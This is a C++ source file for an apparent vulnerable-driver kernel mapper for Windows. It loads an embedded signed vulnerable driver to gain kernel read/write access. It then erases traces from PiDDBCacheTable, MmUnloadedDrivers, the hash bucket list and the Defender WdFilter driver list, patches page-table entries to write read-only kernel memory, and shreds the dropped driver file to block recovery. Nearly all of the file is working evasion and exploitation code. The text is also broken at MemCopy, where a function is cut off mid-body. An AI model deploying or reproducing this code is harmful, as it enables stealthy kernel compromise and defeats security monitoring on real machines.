//Kernel page table self-mapping helpers are declared further down the file.
static bool ProbePteSelfMapBase();
#include "Driver.hpp"
#include <Windows.h>
#include <string>
#include <fstream>

#include "Provider.hpp"
#include "Utils.hpp"
#include "DriverResource.hpp"
#include "Service.hpp"
#include "Nt.hpp"
#include "Pe.hpp"

#ifdef PDB_OFFSETS
#include "SymbolsHandler.hpp"
#endif


HANDLE Driver::hDevice = 0;
ULONG64 Driver::ntoskrnlAddr = 0;
KdmStructOffsets Driver::g_offsets = {};
bool g_driverWasLoadedByUs = false;
bool g_skipForensicCleanup = false;
std::string cachedDriverName = "";

std::wstring Driver::GetDriverNameW() {
	if (cachedDriverName.empty()) {
		//Create a random name
		char buffer[100]{};
		static const char alphanum[] =
			"abcdefghijklmnopqrstuvwxyz"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		int len = rand() % 20 + 10;
		for (int i = 0; i < len; ++i)
			buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
		cachedDriverName = buffer;
	}

	std::wstring name(cachedDriverName.begin(), cachedDriverName.end());
	return name;
}

std::wstring Driver::GetDriverPath() {
	std::wstring temp = Utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool Driver::IsRunning() {
	const HANDLE file_handle = CreateFileW(Provider::kDeviceName, FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

//get Se debug privilege
NTSTATUS Driver::AcquireDebugPrivilege() {

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL) {
		return STATUS_UNSUCCESSFUL;
	}

	ULONG SE_DEBUG_PRIVILEGE = 20UL;
	BOOLEAN SeDebugWasEnabled;
	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
	if (!NT_SUCCESS(Status)) {
		Log("[-] Failed to acquire SE_DEBUG_PRIVILEGE" << std::endl);
	}
	return Status;
}

NTSTATUS Driver::Load() {
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	Log(L"[<] Using vulnerable driver provider: " << Provider::kShortName << L", device " << Provider::kDeviceName << std::endl);

	//If the provider driver is already running on the system (vendor software
	//loaded it) we just reuse the existing device. No service registration,
	//no file drop, nothing to clean up afterwards.
	if (Driver::IsRunning()) {
		Log(L"[+] Provider driver is already loaded, reusing the existing instance (no artifacts will be created)" << std::endl);
	}
	else {
		Log(L"[<] Provider driver not running, loading it, Name: " << GetDriverNameW() << std::endl);

		std::wstring driver_path = GetDriverPath();
		if (driver_path.empty()) {
			Log(L"[-] Can't find TEMP folder" << std::endl);
			return STATUS_UNSUCCESSFUL;
		}

		_wremove(driver_path.c_str());

		if (!Utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(DriverResource::driver), sizeof(DriverResource::driver))) {
			Log(L"[-] Failed to create vulnerable driver file" << std::endl);
			return STATUS_DISK_OPERATION_FAILED;
		}

		auto status = AcquireDebugPrivilege();
		if (!NT_SUCCESS(status)) {
			Log(L"[-] Failed to acquire SeDebugPrivilege" << std::endl);
			_wremove(driver_path.c_str());
			return status;
		}

		status = service::RegisterAndStart(driver_path, GetDriverNameW());
		if (!NT_SUCCESS(status)) {
			Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
			_wremove(driver_path.c_str());
			return status;
		}

		g_driverWasLoadedByUs = true;
	}

	hDevice = CreateFileW(Provider::kDeviceName, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
	{
		Log(L"[-] Failed to open the vulnerable driver device (" << Provider::kShortName << L")" << std::endl);
		Log(L"[-] Note: the embedded driver resource (intel_driver_resource.hpp) must contain the .sys binary of the selected provider." << std::endl);
		Driver::Unload();
		return STATUS_NOT_FOUND;
	}

	ntoskrnlAddr = Utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		Driver::Unload();
		return STATUS_BAD_DLL_ENTRYPOINT;
	}

	//check MZ ntoskrnl.exe
	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!Driver::ReadMemory(Driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		Log(L"[-] Can't exploit the vulnerable driver, is there any antivirus or anticheat running?" << std::endl);
		Driver::Unload();
		return STATUS_INVALID_IMAGE_FORMAT;
	}

	//Replace every structural offset we can with the real one for this build.
	Driver::g_offsets.LoadFromSymbols();
	if (Driver::g_offsets.ResolvedFromSymbols)
		Log(L"[+] Structure offsets resolved from symbols for this build" << std::endl);
	else
		Log(L"[!] Structure offsets are using compiled defaults (unresolved fields are validated at runtime)" << std::endl);

	//The kernel page tables must be reachable before any read-only page write is
	//attempted, so probe them here and fail before the mapper starts instead of
	//half way through.
	if (!Provider::kHasMapIoSpace && !ProbePteSelfMapBase()) {
		Log(L"[-] Aborting: the read-only page write primitive is not available" << std::endl);
		Driver::Unload();
		return STATUS_ACCESS_DENIED;
	}

	if (g_skipForensicCleanup) {
		Log(L"[*] Forensic cleanup skipped (--no-forensics), fewer kernel writes are performed" << std::endl);
		return STATUS_SUCCESS;
	}

	if (!Driver::ClearPiDDBCacheTable()) {
		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		Driver::Unload();
		return STATUS_DELETE_PENDING | 0x1000; //add custom value to error code to identify specific fail
	}

	if (!Driver::ClearKernelHashBucketList()) {
		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		Driver::Unload();
		return STATUS_DELETE_PENDING | 0x2000;
	}

	if (!Driver::ClearMmUnloadedDrivers()) {
		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		Driver::Unload();
		return STATUS_DELETE_PENDING | 0x3000;
	}

	if (!Driver::ClearWdFilterDriverList()) {
		Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
		Driver::Unload();
		return STATUS_DELETE_PENDING | 0x4000;
	}

	return STATUS_SUCCESS;
}

bool Driver::ClearWdFilterDriverList() {

	auto WdFilter = Utils::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		Log("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}

#ifdef PDB_OFFSETS
	uintptr_t MpBmDocOpenRules = SymbolsHandler::GetInstance()->GetOffset(L"MpBmDocOpenRules");
	if (!MpBmDocOpenRules)
	{
		Log("[-] Failed To Get MpBmDocOpenRules." << std::endl);
		return false;
	}
	MpBmDocOpenRules += WdFilter;

	uintptr_t RuntimeDriversList_Head = MpBmDocOpenRules + 0x70;
	uintptr_t RuntimeDriversCount = MpBmDocOpenRules + 0x60;
	uintptr_t RuntimeDriversArray = MpBmDocOpenRules + 0x68;
	ReadMemory(RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));

	uintptr_t MpFreeDriverInfoEx = SymbolsHandler::GetInstance()->GetOffset(L"MpFreeDriverInfoEx");
	if (!MpFreeDriverInfoEx)
	{
		Log("[-] Failed To Get MpFreeDriverInfoEx." << std::endl);
		return false;
	}
	MpFreeDriverInfoEx += WdFilter;
#else
	auto RuntimeDriversList = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	if (!RuntimeDriversList) {
		Log("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
		return false;
	}

	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
	if (!RuntimeDriversCountRef) {
		Log("[!] Failed to find WdFilter RuntimeDriversCount" << std::endl);
		return false;
	}

	// MpCleanupDriverInfo->MpFreeDriverInfoEx
	// The pattern only focus in the 0x8 offset and the possibility of the different order for the instructions
	/*
		49 8B C9                      mov     rcx, r9         ; P
		49 89 50 08                   mov     [r8+8], rdx
		E8 FB F0 FD FF                call    MpFreeDriverInfoEx
		48 8B 0D FC AA FA FF          mov     rcx, cs:qword_1C0021BF0
		E9 21 FF FF FF                jmp     loc_1C007701A
	*/
	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?xx???????????x");
	if (!MpFreeDriverInfoExRef) {
		/*
			48 89 4A 08                   mov     [rdx+8], rcx
			49 8B C8                      mov     rcx, r8         ; P
			E8 C3 58 FE FF                call    sub_1C0065308
			48 8B 0D 44 41 FA FF          mov     rcx, cs:qword_1C0023B90
			E9 39 FF FF FF                jmp     loc_1C007F98A
		*/
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?x???x???????????x");
		if (!MpFreeDriverInfoExRef) {
			Log("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
			return false;
		}
		else {
			Log("[+] Found WdFilter MpFreeDriverInfoEx with second pattern" << std::endl);
		}
		MpFreeDriverInfoExRef += 0x3; // adjust for next sum offset
	}

	MpFreeDriverInfoExRef += 0x3; // skip until call instruction

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversList, 3, 7);
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversCountRef, 2, 6);
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory(RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress((PVOID)MpFreeDriverInfoExRef, 1, 5);
#endif

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* { // Useful lambda to read LIST_ENTRY
		LIST_ENTRY* Entry;
		if (!ReadMemory(Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
	};

	//Every entry is validated before it is unlinked: the name pointer must be a
	//kernel address, the length plausible, and the name must contain the driver
	//we are looking for.
	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		if (!Entry || Entry < (LIST_ENTRY*)0xFFFF000000000000ULL)
			continue;

		UNICODE_STRING Unicode_String;
		if (ReadMemory((uintptr_t)Entry + g_offsets.HashBucketEntry_DriverName, &Unicode_String, sizeof(UNICODE_STRING))) {
			if (((uint64_t)Unicode_String.Buffer) < 0xFFFF000000000000ULL ||
				Unicode_String.Length == 0 ||
				Unicode_String.Length > 1024 ||
				Unicode_String.Length % sizeof(wchar_t) != 0 ||
				Unicode_String.MaximumLength < Unicode_String.Length)
				continue;

			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), Driver::GetDriverNameW().c_str())) {

					//remove from RuntimeDriversArray
					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					for (int k = 0; k < 256; k++) { // max RuntimeDriversArray elements
						PVOID value = 0;
						ReadMemory(RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1); // this is not count+1 is position of cout addr+1
							WriteMemory(RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
							removedRuntimeDriversArray = true;
							break;
						}
					}

					if (!removedRuntimeDriversArray) {
						Log("[!] Failed to remove from RuntimeDriversArray" << std::endl);
						return false;
					}

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));

					WriteMemory(uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));

					// decrement RuntimeDriversCount
					ULONG current = 0;
					ReadMemory(RuntimeDriversCount, &current, sizeof(ULONG));
					current--;
					WriteMemory(RuntimeDriversCount, &current, sizeof(ULONG));

					// call MpFreeDriverInfoEx
					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;

					//verify DriverInfo Magic
					USHORT Magic = 0;
					ReadMemory(DriverInfo, &Magic, sizeof(USHORT));
					if (Magic != 0xDA18) {
						Log("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
					}
					else {
						CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					Log("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
	}
	return false;
}

NTSTATUS Driver::Unload() {
	Log(L"[<] Unloading vulnerable driver" << std::endl);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
		CloseHandle(hDevice);
		hDevice = INVALID_HANDLE_VALUE;
	}

	//If the driver was already running before we started there is nothing to
	//stop, remove or wipe.
	if (!g_driverWasLoadedByUs)
		return STATUS_SUCCESS;

	auto status = service::StopAndRemove(GetDriverNameW());
	if (!NT_SUCCESS(status))
		return status;

	std::wstring driver_path = GetDriverPath();

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	if (!file_ofstream.is_open()) {
		Log(L"[!] Error opening driver file to dump random data inside the disk" << std::endl);
		return STATUS_DELETE_PENDING;
	}

	int newFileLen = sizeof(DriverResource::driver) + (((long long)rand()*(long long)rand()) % 2000000 + 1000);
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		Log(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	//unlink the file
	if (_wremove(driver_path.c_str()) != 0)
		return STATUS_DELETE_PENDING;

	return STATUS_SUCCESS;
}

bool Driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return 0;

	Provider::CopyRequest copy_memory_buffer = { 0 };
	Provider::FillCopyRequest(copy_memory_buffer, destination, source, size);bool Driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
}

bool Driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
}

/*
* PTE self-mapping helpers (x64 Windows).
*
* A provider that only exposes a virtual read/write (a plain kernel memcpy,
* e.g. CVE-2023-20598 in PdFwKrnl) cannot write to read-only kernel pages:
* the copy runs with the CPU page permissions applied and faulting in kernel
* context is an instant bugcheck (0x50).
*
* The kernel aliases its own page tables into the system VA range and those PTE
* pages are ordinary writable kernel memory, so a read-only page can be made
* writable from user mode through the provider: read the PTE, set the RW bit,
* clear NX, write, then restore the original PTE.
*
* The self-map window base is a fixed architectural constant (0xFFFFF68000000000
* on every Windows release since Vista - it is what WinDbg's !pte uses), but it
* is still verified here before it is used: a wrong base means either an
* unmapped read (bugcheck) or a kernel memory corruption. The verification reads
* the PTEs of the first pages of ntoskrnl and requires a pair whose page frame
* numbers differ by exactly one. If that fails, read-only writes are disabled
* instead of continuing blind.
*/
static constexpr uint64_t kPteSelfMapBase = 0xFFFFF68000000000ULL;
static bool g_pteSelfMapReady = false;
static bool g_pteSelfMapProbed = false;
static bool ProbePteSelfMapBase();

/*
* Internal types whose layout is not in the public PDBs (_PiDDBCacheEntry,
* HashBucketEntry and the WdFilter driver info) still need field offsets.
* Instead of trusting a hardcoded number, locate the field by content: scan the
* object for a UNICODE_STRING that actually contains the string we are looking
* for. A match is its own proof, so the offset can be trusted afterwards, and a
* miss is a clean abort instead of a corrupted kernel structure.
*/
static bool ReadWideStringField(const UNICODE_STRING& text, std::wstring& out) {
	if (!text.Buffer || text.Length == 0 || text.Length > 512 || (text.Length % sizeof(wchar_t)) != 0)
		return false;
	if ((uint64_t)text.Buffer < 0xFFFF000000000000ULL)
		return false;
	if (text.MaximumLength < text.Length)
		return false;

	auto buffer = std::make_unique<wchar_t[]>((ULONG64)text.Length / 2ULL + 1ULL);
	if (!Driver::ReadMemory((uintptr_t)text.Buffer, buffer.get(), text.Length))
		return false;

	out.assign(buffer.get());
	return true;
}

//Offset of a UNICODE_STRING member inside object that holds needle, 0 if absent.
static uint32_t FindUnicodeStringFieldByContent(uint64_t object, size_t object_size, const std::wstring& needle) {
	for (uint32_t offset = 0; offset + sizeof(UNICODE_STRING) <= object_size; offset += sizeof(void*)) {
		UNICODE_STRING candidate = { 0 };
		if (!Driver::ReadMemory(object + offset, &candidate, sizeof(candidate)))
			break;

		std::wstring value;
		if (!ReadWideStringField(candidate, value))
			continue;

		if (value == needle)
			return offset;
	}

	return 0;
}

static inline uint64_t PteAddressFor(uint64_t virtual_address) {
	return kPteSelfMapBase + ((virtual_address >> 9) & 0x7FFFFFFFF8ULL);
}

static bool PteCandidateIsPlausible(uint64_t pte) {
	if (!(pte & 0x1)) //not present
		return false;
	if (pte == 0 || pte == (uint64_t)-1)
		return false;
	if (pte & (1ULL << 7)) //large page - not a 4K leaf PTE
		return false;
	if ((pte >> 12) > 0xFFFFFFFFFULL) //PFN beyond the physical address space
		return false;
	return true;
}

static bool ProbePteSelfMapBase() {
	if (g_pteSelfMapProbed)
		return g_pteSelfMapReady;

	g_pteSelfMapProbed = true;
	g_pteSelfMapReady = false;

	uint64_t previous_pfn = 0;

	for (uint32_t page = 0; page < 256; ++page) {
		const uint64_t address = Driver::ntoskrnlAddr + (uint64_t)page * 0x1000;
		uint64_t pte = 0;

		if (!Driver::ReadMemory(PteAddressFor(address), &pte, sizeof(pte))) {
			Log(L"[-] Could not read kernel page table entry" << std::endl);
			return false;
		}

		if (!PteCandidateIsPlausible(pte)) {
			previous_pfn = 0;
			continue;
		}

		const uint64_t pfn = pte >> 12;
		if (previous_pfn && pfn == previous_pfn + 1) {
			Log(L"[+] Kernel PTE self-map verified at 0x" << std::hex << kPteSelfMapBase << std::dec << L" (matched consecutive frames in ntoskrnl)" << std::endl);
			g_pteSelfMapReady = true;
			return true;
		}

		previous_pfn = pfn;
	}

	Log(L"[-] Kernel PTE self-map could not be verified, writes to read-only pages are disabled" << std::endl);
	return false;
}

bool Driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	if constexpr (Provider::kHasMapIoSpace) {
		uint64_t physical_address = 0;

		if (!GetPhysicalAddress(address, &physical_address)) {
			Log(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
			return false;
		}

		const uint64_t mapped_physical_memory = MapIoSpace(physical_address, size);

		if (!mapped_physical_memory) {
			Log(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
			return false;
		}

		bool result = WriteMemory(mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
		UnmapIoSpace(mapped_physical_memory, size);
#else
		if (!UnmapIoSpace(mapped_physical_memory, size))
			Log(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif

		return result;
	}
	else {
		//Virtual-only provider: make the touched pages writable, write, restore.
		if (!ProbePteSelfMapBase())
			return false;

		const uint64_t first_page = address & ~0xFFFULL;
		const uint64_t last_page = (address + (uint64_t)size - 1) & ~0xFFFULL;
		const uint32_t page_count = (uint32_t)((last_page - first_page) / 0x1000) + 1;

		struct PatchedPte { uint64_t pte_address; uint64_t original_pte; };
		PatchedPte patched[16];

		if (page_count > 16) {
			Log(L"[-] WriteToReadOnlyMemory: write spans too many pages (" << page_count << L")" << std::endl);
			return false;
		}

		for (uint32_t page = 0; page < page_count; ++page) {
			const uint64_t target = first_page + (uint64_t)page * 0x1000;
			const uint64_t pte_address = PteAddressFor(target);

			uint64_t original_pte = 0;
			if (!ReadMemory(pte_address, &original_pte, sizeof(original_pte))) {
				Log(L"[-] Failed to read PTE at 0x" << reinterpret_cast<void*>(pte_address) << std::endl);
				return false;
			}

			if (!PteCandidateIsPlausible(original_pte)) {
				Log(L"[-] Unexpected PTE 0x" << std::hex << original_pte << std::dec << L" for page 0x" << reinterpret_cast<void*>(target) << std::endl);
				return false;
			}

			uint64_t new_pte = original_pte;
			new_pte |= 0x2;                  //RW
			new_pte &= ~(1ULL << 63);        //NX

			if (!WriteMemory(pte_address, &new_pte, sizeof(new_pte))) {
				Log(L"[-] Failed to patch PTE at 0x" << reinterpret_cast<void*>(pte_address) << std::endl);
				return false;
			}

			patched[page].pte_address = pte_address;
			patched[page].original_pte = original_pte;
		}

		//A context switch flushes non-global TLB entries so the modified PTEs
		//are actually used by the following write.
		::Sleep(50);

		const bool result = WriteMemory(address, buffer, size);

		::Sleep(50);

		//Restore the original page protections.
		for (uint32_t page = 0; page < page_count; ++page) {
			WriteMemory(patched[page].pte_address, &patched[page].original_pte, sizeof(patched[page].original_pte));
		}

		if (!result)
			Log(L"[-] Write through patched PTE failed for 0x" << reinterpret_cast<void*>(address) << std::endl);

		return result;
	}
}

uint64_t Driver::MmAllocateIndependentPagesEx(uint32_t size)
{
	uint64_t allocated_pages{};

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

#ifdef PDB_OFFSETS	
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = SymbolsHandler::GetInstance()->GetOffset(L"MmAllocateIndependentPagesEx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
		kernel_MmAllocateIndependentPagesEx += Driver::ntoskrnlAddr;
	}
#else
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		//Updated, tested from 1803 to 24H2
		//KeAllocateInterrupt -> 41 8B D6 B9 00 10 00 00 E8 ?? ?? ?? ?? 48 8B D8
		kernel_MmAllocateIndependentPagesEx = Driver::FindPatternInSectionAtKernel((char*)".text", Driver::ntoskrnlAddr,
			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
			(char*)"xxxxxxxxx????xxx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}

		kernel_MmAllocateIndependentPagesEx += 8;

		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
	}
#endif

	if (!Driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool Driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
#ifdef PDB_OFFSETS	
		kernel_MmFreeIndependentPages = SymbolsHandler::GetInstance()->GetOffset(L"MmFreeIndependentPages");
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
		kernel_MmFreeIndependentPages += Driver::ntoskrnlAddr;
#else
		kernel_MmFreeIndependentPages = Driver::FindPatternInSectionAtKernel("PAGE", Driver::ntoskrnlAddr,
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {

			Log(L"[+] Trying second pattern for MmFreeIndependentPages" << std::endl);

			// Windows 11
			kernel_MmFreeIndependentPages = Driver::FindPatternInSectionAtKernel("PAGE", Driver::ntoskrnlAddr,
				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
				(char*)"xx????xxxx????xxx");

			if (!kernel_MmFreeIndependentPages) {
				Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
				return false;
			}

			kernel_MmFreeIndependentPages += 9; // win 11
		}
		else {
			kernel_MmFreeIndependentPages += 8;
		}

		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
#endif
	}

	uint64_t result{};
	return Driver::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN Driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		Log(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;
	
	if (!kernel_MmSetPageProtection)
	{
#ifdef PDB_OFFSETS	
		kernel_MmSetPageProtection = SymbolsHandler::GetInstance()->GetOffset(L"MmSetPageProtection");
		if (!kernel_MmSetPageProtection) {
			Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
		kernel_MmSetPageProtection += Driver::ntoskrnlAddr;
#else
		//Updated, tested from 1803 to 24H2
		//  0F 45 ? ? 8D ? ? ? FF FF E8
		//  0F 45 ? ? 45 8B ? ? ? ? 8D ? ? ? ? ? ? FF FF E8  (Some windows builds have a instruction in the middle)
		kernel_MmSetPageProtection = Driver::FindPatternInSectionAtKernel("PAGELK", Driver::ntoskrnlAddr, 
			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
			(char*)"xx??x???xxx");
		if (!kernel_MmSetPageProtection) {

			kernel_MmSetPageProtection = Driver::FindPatternInSectionAtKernel("PAGELK", Driver::ntoskrnlAddr,
				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
				(char*)"xx??xx????x???xxx");

			if (!kernel_MmSetPageProtection) {
				Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
				return FALSE;
			}

			kernel_MmSetPageProtection += 13;
		}
		else {
			kernel_MmSetPageProtection += 10;
		}

		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection) {
			Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
#endif
	}

	BOOLEAN set_prot_status{};
	if (!Driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}

uint64_t Driver::AllocatePool(Nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExAllocatePoolWithTag");

	if (!kernel_ExAllocatePool) {
		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE')) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
		return 0;

	return allocated_pool;
}

bool Driver::FreePool(uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExFreePool");

	if (!kernel_ExFreePool) {
		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

uint64_t Driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

